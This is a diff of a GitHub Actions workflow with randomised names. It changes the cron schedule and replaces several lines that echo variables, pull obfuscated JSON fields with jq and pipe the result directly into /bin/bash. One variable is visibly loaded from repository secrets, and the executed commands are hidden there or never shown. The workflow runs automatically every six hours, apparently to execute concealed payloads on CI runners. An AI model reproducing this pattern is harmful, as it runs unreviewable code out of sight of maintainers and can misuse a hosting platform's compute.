@@ -3,21 +3,21 @@ name: ludishen9910
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 5/6 * * *'
+    - cron: '52 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: ludishen9910
         env:
-          gnzvl3: ${{ secrets.gnzvl3 }}
+          gdm1: ${{ secrets.gdm1 }}
         run: |
-          echo $gnzvl3 | jq -r .uvet17 | /bin/bash
-          echo $ae11312 | jq -r .u110 | /bin/bash
-          echo $arl0616 | jq -r .zop35 | /bin/bash
-          echo $gh4121 | jq -r .vwzaz51720 | /bin/bash
-          echo $x2 | jq -r .xdbqi29758 | /bin/bash
-          echo $rem75 | jq -r .hr2 | /bin/bash
+          echo $gdm1 | jq -r .rbt556 | /bin/bash
+          echo $eh33 | jq -r .hrdd3412 | /bin/bash
+          echo $ahvvr9 | jq -r .aiw17 | /bin/bash
+          echo $mmh57837 | jq -r .v4 | /bin/bash
+          echo $e164 | jq -r .c2 | /bin/bash
+          echo $stnax8 | jq -r .hlebg07 | /bin/bash
+          echo $hlqrf91 | jq -r .nsen17382 | /bin/bash
 
